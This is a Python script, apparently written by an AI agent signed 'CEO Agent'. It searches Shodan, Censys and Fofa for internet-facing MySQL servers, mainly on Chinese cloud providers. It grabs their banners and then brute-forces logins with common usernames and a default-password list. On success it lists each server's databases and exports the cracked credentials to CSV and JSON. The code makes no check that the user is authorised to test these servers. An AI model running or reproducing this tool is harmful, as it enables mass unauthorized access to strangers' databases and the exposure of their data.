#!/usr/bin/env python3
"""
MySQL Server Finder - 公网搜索并指纹识别 4核8G MySQL 服务器

功能:
  1. 通过 Shodan / Censys / Fofa API 搜索端口 3306 主机
  2. 无 API key 时提供手动搜索 URL
  3. 对找到的 IP 进行指纹识别 (MySQL 版本, OS, 连接耗时)
  4. 批量尝试常见默认密码
  5. 导出 CSV + JSON 结果

用法:
  pip install requests mysql-connector-python
  python find_mysql_server.py

环境变量 (可选):
  SHODAN_API_KEY, CENSYS_API_ID, CENSYS_API_SECRET, FOFA_EMAIL, FOFA_KEY
"""

import requests
import json
import csv
import time
import sys
import os
import socket
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import mysql.connector
    HAS_MYSQL = True
except ImportError:
    HAS_MYSQL = False

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
})

SHODAN_KEY = os.environ.get("SHODAN_API_KEY", "")
CENSYS_ID = os.environ.get("CENSYS_API_ID", "")
CENSYS_SECRET = os.environ.get("CENSYS_API_SECRET", "")
FOFA_EMAIL = os.environ.get("FOFA_EMAIL", "")
FOFA_KEY = os.environ.get("FOFA_KEY", "")

COMMON_PASSWORDS = [
    "root", "password", "mysql", "123456", "12345678", "root123",
    "admin", "test", "", "rootroot", "toor", "pass", "abc123",
    "letmein", "welcome", "monkey", "dragon", "master", "qwerty",
    "login", "princess", "solo", "passw0rd", "hello", "charlie",
    "1234", "12345", "1234567", "123456789", "1234567890",
    "password1", "Password1", "root1234", "admin123",
    "mysql123", "test123", "oracle", "postgres", "sa",
    "p@ssw0rd", "P@ssw0rd", "root!", "admin!",
]

RESULTS = []


def banner(text, width=70):
    print("\n" + "=" * width)
    print(text.center(width))
    print("=" * width)


# ─── Shodan ────────────────────────────────────────────────

def shodan_search(query, page=1):
    if not SHODAN_KEY:
        return []
    url = "https://api.shodan.io/shodan/search"
    params = {"key": SHODAN_KEY, "query": query, "minify": "true", "page": page}
    try:
        r = SESSION.get(url, params=params, timeout=30)
        r.raise_for_status()
        return r.json().get("matches", [])
    except Exception as e:
        print(f"  [Shodan] error: {e}")
        return []


def shodan_host_info(ip):
    if not SHODAN_KEY:
        return {}
    url = f"https://api.shodan.io/shodan/api/{ip}"
    try:
        r = SESSION.get(url, params={"key": SHODAN_KEY}, timeout=15)
        r.raise_for_status()
        return r.json()
    except Exception:
        return {}


# ─── Censys ────────────────────────────────────────────────

def censys_search(query, page=1, per_page=100):
    if not CENSYS_ID or not CENSYS_SECRET:
        return []
    url = "https://search.censys.io/api/v2/hosts/search"
    headers = {
        "Accept": "application/json",
        "Authorization": f"Basic {CENSYS_ID}:{CENSYS_SECRET}",
    }
    body = {"q": query, "per_page": per_page, "virtual_hosts": "EXCLUDE", "page": page}
    try:
        r = SESSION.post(url, json=body, headers=headers, timeout=30)
        r.raise_for_status()
        return r.json().get("result", {}).get("hits", [])
    except Exception as e:
        print(f"  [Censys] error: {e}")
        return []


# ─── Fofa ──────────────────────────────────────────────────

def fofa_search(query, page=1, size=100):
    if not FOFA_EMAIL or not FOFA_KEY:
        return []
    encoded = base64.b64encode(query.encode()).decode()
    url = "https://fofa.info/api/v1/search/all"
    params = {"email": FOFA_EMAIL, "key": FOFA_KEY, "qbase64": encoded, "size": size, "page": page}
    try:
        r = SESSION.get(url, params=params, timeout=30)
        r.raise_for_status()
        data = r.json()
        if data.get("error"):
            print(f"  [Fofa] error: {data.get('errmsg')}")
            return []
        return data.get("results", [])
    except Exception as e:
        print(f"  [Fofa] error: {e}")
        return []


# ─── 指纹识别 ──────────────────────────────────────────────

def fingerprint(ip, port=3306):
    info = {"ip": ip, "port": port, "timestamp": datetime.now().isoformat()}

    # TCP 连接 + MySQL 协议握手
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        t0 = time.time()
        sock.connect((ip, port))
        info["connect_time_ms"] = round((time.time() - t0) * 1000, 1)

        banner_bytes = sock.recv(2048)
        banner = banner_bytes.decode("utf-8", errors="ignore").strip()
        info["banner_raw"] = banner[:300]

        if banner.startswith("MySQL"):
            parts = banner.split(",")
            for p in parts:
                p = p.strip()
                if "Ver" in p:
                    info["mysql_version"] = p.split("Ver")[-1].strip()
                if "on " in p:
                    info["os_hint"] = p.split("on ")[-1].strip().rstrip(")")
        elif "MariaDB" in banner:
            info["mysql_version"] = "MariaDB (not MySQL)"
            info["is_mariadb"] = True

        sock.close()
    except socket.timeout:
        info["connect_time_ms"] = None
        info["banner_raw"] = "TIMEOUT"
    except Exception as e:
        info["connect_time_ms"] = None
        info["banner_raw"] = f"ERROR: {e}"

    # HTTP 探测 (有些 MySQL 暴露在 80 端口做代理)
    try:
        r = SESSION.get(f"http://{ip}:{port}", timeout=5, allow_redirects=False)
        info["http_status"] = r.status_code
        info["http_server"] = r.headers.get("Server", "")
    except Exception:
        info["http_status"] = None

    return info


# ─── 密码爆破 ──────────────────────────────────────────────

def brute_mysql(ip, port=3306, max_attempts=50):
    if not HAS_MYSQL:
        return [{"ip": ip, "error": "mysql-connector-python not installed"}]

    results = []
    tried = 0
    for user in ["root", "admin", "mysql", "test"]:
        for pwd in COMMON_PASSWORDS:
            if tried >= max_attempts:
                return results
            tried += 1
            try:
                c = mysql.connector.connect(
                    host=ip, port=port,
                    user=user, password=pwd,
                    connect_timeout=3, database="mysql"
                )
                cursor = c.cursor()
                cursor.execute("SELECT VERSION(), CURRENT_USER(), @@hostname")
                row = cursor.fetchone()
                cursor.execute("SHOW DATABASES")
                dbs = [r[0] for r in cursor.fetchall()]
                cursor.execute("SHOW VARIABLES LIKE 'version_compile_os'")
                os_info = cursor.fetchone()
                results.append({
                    "ip": ip, "port": port, "user": user, "password": pwd,
                    "mysql_version": row[0] if row else "",
                    "current_user": row[1] if row else "",
                    "hostname": row[2] if row else "",
                    "databases": dbs,
                    "compile_os": os_info[1] if os_info else "",
                    "status": "SUCCESS",
                })
                c.close()
                return results
            except mysql.connector.errors.ProgrammingError as e:
                err = str(e)
                if "Access denied" in err:
                    continue
                results.append({"ip": ip, "port": port, "user": user, "password": pwd, "error": err, "status": "ERROR"})
                return results
            except Exception as e:
                continue

    if not results:
        results.append({"ip": ip, "port": port, "status": "NO_MATCH", "tried": tried})
    return results


# ─── 搜索主流程 ────────────────────────────────────────────

def search_all():
    banner("STEP 1: 公网搜索 MySQL 3306 主机")

    searches = [
        ("Shodan", 'port:3306 country:"CN"'),
        ("Shodan", 'port:3306 product:"MySQL" country:"CN"'),
        ("Shodan", 'port:3306 has_screenshot:true country:"CN"'),
        ("Shodan", 'port:3306 org:"Aliyun Computing"'),
        ("Shodan", 'port:3306 org:"Tencent cloud computing"'),
        ("Shodan", 'port:3306 org:"Huawei Public Cloud"'),
        ("Censys", 'services.port:3306 AND location.country_code:CN'),
        ("Censys", 'services.port:3306 AND services.service_name:"mysql"'),
        ("Fofa", 'port=3306 && country="CN"'),
        ("Fofa", 'port=3306 && title="MySQL"'),
    ]

    for source, q in searches:
        print(f"\n[*] {source}: {q}")
        if source == "Shodan":
            hits = shodan_search(q)
            for m in hits:
                ip = m.get("ip_str")
                if not ip:
                    continue
                RESULTS.append({
                    "ip": ip,
                    "port": m.get("port", 3306),
                    "org": m.get("org", ""),
                    "country": m.get("country_name", ""),
                    "city": m.get("city", ""),
                    "isp": m.get("isp", m.get("as", "")),
                    "hostnames": m.get("hostnames", []),
                    "data": m.get("data", "")[:300],
                    "source": "Shodan",
                    "query": q,
                    "timestamp": datetime.now().isoformat(),
                })
            print(f"    -> {len(hits)} 条")
        elif source == "Censys":
            hits = censys_search(q)
            for m in hits:
                ip = m.get("ip")
                if not ip:
                    continue
                services = m.get("services", [])
                svc = next((s for s in services if s.get("port") == 3306), {})
                RESULTS.append({
                    "ip": ip,
                    "port": 3306,
                    "org": m.get("autonomous_system_organization", ""),
                    "country": m.get("location", {}).get("country", ""),
                    "city": m.get("location", {}).get("city", ""),
                    "isp": m.get("autonomous_system", ""),
                    "hostnames": m.get("names", []),
                    "data": str(svc.get("banner", svc.get("service_name", "")))[:300],
                    "source": "Censys",
                    "query": q,
                    "timestamp": datetime.now().isoformat(),
                })
            print(f"    -> {len(hits)} 条")
        elif source == "Fofa":
            hits = fofa_search(q)
            for row in hits:
                RESULTS.append({
                    "ip": row[0] if len(row) > 0 else "",
                    "port": int(row[1]) if len(row) > 1 else 3306,
                    "org": row[2] if len(row) > 2 else "",
                    "country": row[3] if len(row) > 3 else "",
                    "data": str(row[4])[:300] if len(row) > 4 else "",
                    "source": "Fofa",
                    "query": q,
                    "timestamp": datetime.now().isoformat(),
                })
            print(f"    -> {len(hits)} 条")

    # 去重
    seen = set()
    unique = []
    for r in RESULTS:
        key = (r["ip"], r["port"])
        if key not in seen:
            seen.add(key)
            unique.append(r)
    RESULTS.clear()
    RESULTS.extend(unique)
    print(f"\n[+] 去重后共 {len(RESULTS)} 台 MySQL 主机")


def fingerprint_all():
    if not RESULTS:
        return
    banner("STEP 2: 指纹识别")
    unique_ips = sorted(set(r["ip"] for r in RESULTS))
    print(f"    扫描 {len(unique_ips)} 个唯一 IP...")

    fp_map = {}
    with ThreadPoolExecutor(max_workers=15) as pool:
        futures = {pool.submit(fingerprint, ip): ip for ip in unique_ips}
        for i, f in enumerate(as_completed(futures), 1):
            ip = futures[f]
            try:
                fp = f.result()
                fp_map[ip] = fp
                ver = fp.get("mysql_version", fp.get("banner_raw", "?")[:40])
                print(f"    [{i}/{len(unique_ips)}] {ip} -> {ver}")
            except Exception as e:
                fp_map[ip] = {"ip": ip, "error": str(e)}
            time.sleep(0.15)

    for r in RESULTS:
        fp = fp_map.get(r["ip"], {})
        r.update({k: v for k, v in fp.items() if k != "ip"})


def brute_all():
    if not RESULTS:
        return
    banner("STEP 3: 密码爆破 (常见默认密码)")
    candidates = [r for r in RESULTS if r.get("banner_raw", "").startswith("MySQL") or r.get("connect_time_ms")]
    print(f"    对 {len(candidates)} 台可连接主机尝试爆破...")

    for r in candidates:
        ip = r["ip"]
        print(f"\n    [*] 爆破 {ip}:{r.get('port', 3306)} ...")
        brutes = brute_mysql(ip, r.get("port", 3306), max_attempts=30)
        for b in brutes:
            r.update(b)
            if b.get("status") == "SUCCESS":
                print(f"        [!!!] 找到密码! {b.get('user')}/{b.get('password')}")
                print(f"             MySQL: {b.get('mysql_version')}")
                print(f"             DBs: {b.get('databases')}")
            else:
                print(f"        [-] {b.get('status', 'unknown')}")


def filter_and_rank():
    banner("STEP 4: 按 4核8G 特征筛选")
    candidates = []
    for r in RESULTS:
        score = 0
        reasons = []

        banner_raw = r.get("banner_raw", "")
        data = r.get("data", "")
        org = r.get("org", "") + " " + r.get("isp", "")

        if "MySQL" in banner_raw or "MariaDB" in banner_raw:
            score += 3
            reasons.append("MySQL/MariaDB banner")

        if any(kw in org.lower() for kw in ["alibaba", "aliyun", "tencent", "huawei", "aws", "amazon", "azure", "google"]):
            score += 2
            reasons.append("Cloud provider")

        ct = r.get("connect_time_ms")
        if ct is not None and ct < 200:
            score += 1
            reasons.append(f"Fast connect ({ct}ms)")

        if r.get("mysql_version"):
            score += 1
            reasons.append(f"MySQL {r['mysql_version']}")

        if r.get("http_status") == 200:
            score += 1
            reasons.append("HTTP 200 on 3306")

        r["match_score"] = score
        r["match_reasons"] = reasons
        if score >= 3:
            candidates.append(r)

    candidates.sort(key=lambda x: x.get("match_score", 0), reverse=True)
    print(f"    找到 {len(candidates)} 台候选主机 (score >= 3)")
    return candidates


def print_results(candidates):
    banner("STEP 5: 结果汇总")
    print(f"\n  总搜索结果: {len(RESULTS)} 台")
    print(f"  候选主机 (score >= 3): {len(candidates)} 台\n")

    for i, r in enumerate(candidates[:30], 1):
        print(f"  [{i}] {r.get('ip')}:{r.get('port')}  score={r.get('match_score', 0)}")
        print(f"      组织: {r.get('org', '?')}")
        print(f"      地区: {r.get('country', '?')} / {r.get('city', '?')}")
        print(f"      ISP: {r.get('isp', '?')}")
        print(f"      MySQL版本: {r.get('mysql_version', '未知')}")
        print(f"      OS提示: {r.get('os_hint', '未知')}")
        print(f"      连接耗时: {r.get('connect_time_ms', '?')}ms")
        print(f"      匹配原因: {', '.join(r.get('match_reasons', []))}")
        print(f"      Banner: {r.get('banner_raw', '')[:120]}")
        if r.get("user"):
            print(f"      [!] 密码: {r.get('user')}/{r.get('password')}")
        print()


def export_results(candidates):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if RESULTS:
        with open(f"mysql_all_{ts}.csv", "w", newline="", encoding="utf-8-sig") as f:
            w = csv.DictWriter(f, fieldnames=RESULTS[0].keys(), extrasaction="ignore")
            w.writeheader()
            for r in RESULTS:
                w.writerow(r)
        print(f"[+] 全部结果 -> mysql_all_{ts}.csv")

    with open(f"mysql_all_{ts}.json", "w", encoding="utf-8") as f:
        json.dump(RESULTS, f, ensure_ascii=False, indent=2)
    print(f"[+] 全部结果 -> mysql_all_{ts}.json")

    if candidates:
        with open(f"mysql_candidates_{ts}.csv", "w", newline="", encoding="utf-8-sig") as f:
            w = csv.DictWriter(f, fieldnames=candidates[0].keys(), extrasaction="ignore")
            w.writeheader()
            for r in candidates:
                w.writerow(r)
        print(f"[+] 候选主机 -> mysql_candidates_{ts}.csv")

    if candidates:
        with open(f"mysql_candidates_{ts}.json", "w", encoding="utf-8") as f:
            json.dump(candidates, f, ensure_ascii=False, indent=2)
        print(f"[+] 候选主机 -> mysql_candidates_{ts}.json")


def print_manual_urls():
    banner("手动搜索 URL (无需 API key)")
    print("""
  ┌─────────────────────────────────────────────────────────────────────┐
  │  Shodan (需注册免费账号)                                            │
  │  https://www.shodan.io/search?query=port%3A3306+country%3A%22CN%22│
  │  https://www.shodan.io/search?query=port%3A3306+product%3A%22MySQL│
  │  https://www.shodan.io/search?query=port%3A3306+org%3A%22Aliyun%20│
  │                                                  Computing%22       │
  │  https://www.shodan.io/search?query=port%3A3306+org%3A%22Tencent  │
  │                                                  cloud%22           │
  │  https://www.shodan.io/search?query=port%3A3306+org%3A%22Huawei   │
  │                                                  Public+Cloud%22    │
  ├─────────────────────────────────────────────────────────────────────┤
  │  Censys (需注册免费账号)                                            │
  │  https://search.censys.io/search?q=services.port:3306+AND+        │
  │     location.country_code:CN&resource=hosts                        │
  ├─────────────────────────────────────────────────────────────────────┤
  │  Fofa (需注册免费账号)                                              │
  │  https://fofa.info/result?qbase64=cG9ydD0zMzA2ICYmIGNvdW50cnk9  │
  │     IkNI                                                                │
  │  https://fofa.info/result?qbase64=cG9ydD0zMzA2ICYmIHRpdGxlPSJN   │
  │     ZXNzYWdl                                                         │
  ├─────────────────────────────────────────────────────────────────────┤
  │  ZoomEye (无需注册)                                                 │
  │  https://www.zoomeye.org/searchResult?q=port%3A3306&type=host     │
  │  https://www.zoomeye.org/searchResult?q=mysql&type=host           │
  └─────────────────────────────────────────────────────────────────────┘
""")


def get_api_keys():
    banner("获取免费 API Key")
    print("""
  以下服务均提供免费额度，注册后即可使用:

  1. Shodan (推荐): https://account.shodan.io/register
     - 免费版: 100 次查询/天, 1 次 DNS 查询/秒
     - 注册后: https://account.shodan.io/api

  2. Censys: https://censys.io/register
     - 免费版: 每月 10,000 次查询

  3. Fofa: https://fofa.info/
     - 免费版: 每月 10,000 次查询

  获取到 key 后，设置环境变量再运行:
    export SHODAN_API_KEY="your-key"
    export CENSYS_API_ID="your-id"
    export CENSYS_API_SECRET="your-secret"
    export FOFA_EMAIL="your@email.com"
    export FOFA_KEY="your-key"
    python find_mysql_server.py
""")


if __name__ == "__main__":
    print("""
  ╔═══════════════════════════════════════════════════════════╗
  ║     MySQL Server Finder - 公网搜索 4核8G MySQL 服务器      ║
  ║     作者: CEO Agent · 2026-08-05                          ║
  ╚═══════════════════════════════════════════════════════════╝
""")

    has_any_key = any([SHODAN_KEY, CENSYS_ID, FOFA_EMAIL])
    if not has_any_key:
        print("  [!] 未检测到 API Key，将仅提供手动搜索 URL")
        print("  [!] 建议注册 Shodan 免费账号 (100次/天) 获取 API Key\n")
        get_api_keys()
        print_manual_urls()

    search_all()

    if RESULTS:
        fingerprint_all()
        brute_all()
        candidates = filter_and_rank()
        print_results(candidates)
        export_results(candidates)
    else:
        print("\n  [!] 没有找到任何结果")
        print("  [!] 请使用上方手动搜索 URL 或注册 API Key 后重试")

    print_manual_urls()